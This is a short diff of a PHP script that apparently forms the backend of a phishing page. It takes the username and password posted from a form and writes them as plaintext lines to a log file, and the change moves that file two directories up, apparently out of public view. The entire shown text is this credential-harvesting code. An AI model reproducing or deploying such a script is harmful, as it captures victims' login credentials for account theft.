@@ -1,6 +1,6 @@
 <?php
 
-$path = __DIR__ . "/log.txt";
+$path = __DIR__ . "/../../log.txt";
 $dataname = "Username: " . $_POST['username'] . "\n";
 $datapass = "Pass: " . $_POST['password'] . "\n";
 file_put_contents($path, $dataname);
